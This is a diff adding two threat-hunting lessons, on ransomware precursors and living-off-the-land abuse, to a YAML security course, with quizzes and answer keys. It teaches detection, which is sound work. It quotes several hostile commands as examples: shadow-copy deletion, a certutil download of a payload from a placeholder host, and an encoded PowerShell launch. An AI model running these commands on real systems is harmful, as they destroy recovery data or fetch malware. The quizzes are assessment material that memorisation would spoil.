@@ -644,3 +644,192 @@ lessons:
           - Trusting the IP geolocation alone
         answer: 1
         explanation: Baselines plus correlation turn ambiguous single events into a defensible finding and cut false positives.
+  - slug: hunt-ransomware-precursors
+    title: Hunting Ransomware Precursors
+    order: 8
+    difficulty: intermediate
+    summary: Hunt for the activity that precedes ransomware, access, discovery, credential theft, lateral movement and staging, so it is caught in the hours before encryption, not after.
+    theory_minutes: 12
+    lab_minutes: 54
+    objectives: ["cysa:1.4", "cysa:3.1", "sc200:4"]
+    learning_objectives:
+      - Describe the typical stages that precede ransomware encryption
+      - Hunt for discovery, credential access, lateral movement and staging behaviours
+      - Prioritise precursor findings so response happens before encryption
+    theory: |
+      Ransomware encryption is the last act, not the first. Modern ransomware intrusions unfold over hours
+      to days: an initial foothold (phishing, a vulnerable service, bought access), then **discovery** of
+      the environment, **credential theft** to gain privilege, **lateral movement** to spread,
+      **defence evasion** (disabling security tools, clearing logs), **exfiltration** for double extortion,
+      and finally mass **encryption**. Every stage before the last leaves telemetry, so the goal of hunting
+      ransomware is to catch the precursors and respond in the window before the payload fires.
+
+      The precursor behaviours are specific and huntable. **Discovery** shows up as a burst of network and
+      AD enumeration, tools like network scanners, `net`/`nltest`, or AD query tools run in quick
+      succession. **Credential access** appears as LSASS access, Kerberoasting, or a dump of the domain
+      database. **Lateral movement** rides legitimate channels, RDP, SMB, remote service creation, WMI, and
+      a spike of these from one host to many is a strong signal. **Staging and defence evasion** include
+      shadow-copy deletion (`vssadmin delete shadows`), stopping backup and AV services, and archiving data
+      before exfiltration. Hunting for these behaviours, rather than a specific ransomware family, catches
+      intrusions regardless of the strain.
+
+      Because the clock is running, **prioritisation** is everything. A precursor finding is not a routine
+      queue item; shadow-copy deletion or mass SMB access from one host is a likely active intrusion minutes
+      from encryption, and it is escalated immediately for containment, isolate the host, disable the
+      account, rather than worked slowly. The hunter still confirms, a backup admin legitimately touches
+      shadow copies, but the bar for fast action is low when the pattern fits a ransomware kill chain. The
+      payoff of this hunt is the whole game: catching it at discovery or lateral movement means a contained
+      incident; catching it at encryption means a disaster-recovery event.
+    examples:
+      - title: A precursor kill chain to catch early
+        body: |
+          foothold -> AD discovery (nltest/net) -> LSASS dump -> RDP/SMB to many hosts
+          -> stop AV + "vssadmin delete shadows" -> archive + exfil -> ENCRYPT
+          Every arrow before ENCRYPT is a chance to hunt and contain.
+      - title: A high-urgency precursor
+        body: |
+          Event: "vssadmin delete shadows /all" on a file server
+          Legit? rarely -> likely ransomware staging, minutes from encryption
+          Action: escalate NOW (isolate host, disable account), confirm in parallel.
+    exercise:
+      title: Hunt a data set for ransomware precursors
+      environment: Sample endpoint, AD and network logs (provided or lab-generated) containing some benign and some precursor-like activity
+      tools: [A SIEM or notebook, sample logs, a MITRE ATT&CK reference, a notes file]
+      steps:
+        - List the stages that precede ransomware encryption and the telemetry each would produce.
+        - Hunt the logs for discovery activity (a burst of network or AD enumeration) and note what you find.
+        - Hunt for credential-access and lateral-movement signals (LSASS access, RDP/SMB spikes from one host to many).
+        - Hunt for staging and defence evasion (shadow-copy deletion, stopping backup or AV services) and rate its urgency.
+        - For the highest-urgency finding, write the immediate containment action and say how you would confirm in parallel rather than before acting.
+        - Map your findings to ATT&CK stages and state at which stage you would have caught this intrusion.
+      deliverable: A hunt write-up listing the precursor stages found, the highest-urgency finding with an immediate containment action, and the ATT&CK stage at which the intrusion would have been caught.
+    expected_outcome: >
+      You can hunt the discovery, credential-access, lateral-movement and staging behaviours that precede
+      ransomware, prioritise a precursor as an active intrusion, and drive containment in the window before
+      encryption rather than after.
+    quiz:
+      - prompt: Why hunt ransomware precursors rather than the encryption itself?
+        options:
+          - Encryption is harmless
+          - The stages before encryption leave telemetry and offer a window to contain the intrusion first
+          - Precursors are easier to ignore
+          - Encryption cannot be detected
+        answer: 1
+        explanation: Catching discovery, credential theft or lateral movement lets you contain before the payload fires.
+      - prompt: Deletion of volume shadow copies (vssadmin delete shadows) is
+        options:
+          - Routine maintenance to ignore
+          - A high-urgency ransomware-staging signal to escalate immediately
+          - A network scan
+          - A backup success
+        answer: 1
+        explanation: Destroying shadow copies removes recovery options and typically precedes encryption, warranting immediate action.
+      - prompt: Hunting for precursor behaviours rather than a specific family means
+        options:
+          - It only works on one strain
+          - It catches ransomware intrusions regardless of the particular family
+          - It needs the ransom note first
+          - It ignores lateral movement
+        answer: 1
+        explanation: Behaviour-based hunting generalises across strains because the kill-chain stages are common.
+      - prompt: A spike of RDP/SMB connections from one host to many is a sign of
+        options: [Normal backups, Lateral movement worth urgent investigation, A DNS change, A patch install]
+        answer: 1
+        explanation: One host suddenly reaching many others over remote channels is classic lateral movement.
+  - slug: hunt-lolbins
+    title: Hunting Living-off-the-Land Techniques
+    order: 9
+    difficulty: intermediate
+    summary: Hunt attackers who abuse built-in, trusted system tools (LOLBins) to blend in, by focusing on anomalous usage and context rather than the presence of the tool itself.
+    theory_minutes: 12
+    lab_minutes: 54
+    objectives: ["cysa:1.4", "cysa:3.1", "sc200:2"]
+    learning_objectives:
+      - Explain living-off-the-land and why it evades simple detection
+      - Identify commonly abused built-in tools and how attackers use them
+      - Hunt for anomalous usage of trusted binaries by context, not presence
+    theory: |
+      Sophisticated attackers increasingly avoid bringing their own malware and instead **live off the land**,
+      abusing the legitimate, signed, built-in tools already on the system (**LOLBins** on Windows, standard
+      utilities on Linux). PowerShell, `certutil`, `rundll32`, `wmic`, `bitsadmin`, `curl`, `ssh` and the
+      scripting hosts are all normal administrative tools, which is exactly why attackers use them: they are
+      trusted, present everywhere, and often excluded from suspicion. This defeats detection that looks for
+      unknown or malicious files, because nothing unknown ever touches the disk, the attack is built entirely
+      from tools the defender's own OS provides.
+
+      Because the tools themselves are legitimate, hunting LOLBins means shifting from "is this binary bad"
+      to "is this *usage* anomalous". The same `certutil` that an admin uses to manage certificates is
+      suspicious when it downloads a file from the internet; `rundll32` is normal, but not spawned by Word
+      with an odd export; PowerShell is everywhere, but encoded commands, downloads from memory, and
+      execution spawned by an Office document are the tells. The hunt focuses on **context**: the parent
+      process, the command-line arguments, the user, and whether this tool is normally used this way on this
+      host. A LOLBin invoked by a document, with network activity, in a way its administrators never use, is
+      the signal.
+
+      This is where behavioural baselining and the MITRE ATT&CK catalogue pay off, ATT&CK documents the
+      LOLBin techniques, and knowing your environment's normal admin patterns lets you spot the abuse against
+      them. The hunter's discipline is to hunt for the suspicious **pattern** (the download-and-execute, the
+      Office-spawned shell, the encoded command) rather than banning the tool, because these tools are needed
+      for legitimate work and cannot simply be removed. Catching living-off-the-land is one of the clearest
+      examples of why modern detection is behavioural: the artefact is a trusted tool, so only its anomalous
+      use reveals the attacker.
+    examples:
+      - title: Same tool, benign versus abused
+        body: |
+          certutil -dump cert.cer          -> admin managing certificates (normal)
+          certutil -urlcache -f http://bad/x.exe x.exe -> downloading a payload (abuse)
+          The binary is identical; the usage and context are the signal.
+      - title: Context that flags a LOLBin
+        body: |
+          parent: WINWORD.EXE  ->  child: powershell.exe -enc <base64>
+          An Office document spawning an encoded PowerShell command
+          Normal admin never does this -> hunt the pattern, not the tool.
+    exercise:
+      title: Hunt a data set for living-off-the-land abuse
+      environment: Sample endpoint/process logs (provided or lab-generated) with benign admin activity and some LOLBin abuse
+      tools: [A SIEM or notebook, sample process-creation logs, a LOLBin/ATT&CK reference, a notes file]
+      steps:
+        - Explain why living-off-the-land defeats detection that looks for unknown or malicious files.
+        - List several commonly abused built-in tools and one abuse technique for each.
+        - Hunt the process logs for a trusted tool used in an anomalous way (download, encoded command, odd parent) and describe what you found.
+        - For one finding, show the context (parent process, command line, user) that makes it suspicious rather than the tool itself.
+        - Explain why banning the tool is not a viable response and what you would detect instead.
+        - Map your findings to ATT&CK techniques and note the normal admin baseline you compared against.
+      deliverable: A hunt write-up explaining the LOLBin problem, listing abused tools, one anomalous-usage finding with its damning context, why banning the tool is not viable, and the ATT&CK mapping.
+    expected_outcome: >
+      You can explain living-off-the-land, recognise the built-in tools attackers abuse, and hunt for
+      anomalous usage by context, parent process, command line and baseline, rather than the mere presence
+      of a trusted binary.
+    quiz:
+      - prompt: Living-off-the-land evades simple detection because
+        options:
+          - It uses custom malware
+          - It abuses legitimate, trusted built-in tools, so nothing unknown touches the disk
+          - It only works offline
+          - It needs admin rights always
+        answer: 1
+        explanation: Using signed, built-in tools means file-based detection finds nothing unknown to flag.
+      - prompt: To hunt LOLBins, you should focus on
+        options:
+          - Whether the binary exists
+          - Whether the usage is anomalous, by parent process, arguments, user and baseline
+          - The file size only
+          - The time of day only
+        answer: 1
+        explanation: The tools are legitimate, so anomalous usage and context, not presence, reveal the attack.
+      - prompt: certutil downloading a file from the internet is suspicious because
+        options:
+          - certutil cannot download
+          - That is an abuse of a certificate tool to fetch a payload, unlike its normal use
+          - It is always malicious software
+          - It deletes logs
+        answer: 1
+        explanation: Using a certificate utility to download files is a classic LOLBin technique distinct from its legitimate purpose.
+      - prompt: Why is banning an abused built-in tool usually not viable?
+        options:
+          - It is impossible technically
+          - The tools are needed for legitimate administration, so you detect the abusive pattern instead
+          - It would speed up the system
+          - It has no effect on attackers
+        answer: 1
+        explanation: These tools serve real admin needs, so detection targets the suspicious usage pattern rather than removing the tool.
